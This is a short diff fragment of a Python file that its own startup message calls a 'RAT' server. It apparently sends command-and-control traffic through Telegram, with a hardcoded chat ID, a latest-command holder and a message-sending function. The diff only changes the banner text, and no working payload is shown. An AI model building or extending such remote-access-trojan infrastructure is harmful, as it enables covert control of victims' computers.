@@ -12,7 +12,7 @@ CHAT_ID = '7803661441'
 
 latest_command = {"cmd": "none", "params": ""}
 
-print("✅ RAT сервер запущен", flush=True)
+print("✅ Без жалости", flush=True)
 
 # ========== ОТПРАВКА СООБЩЕНИЙ ==========
 def send_tg(text, keyboard=None):
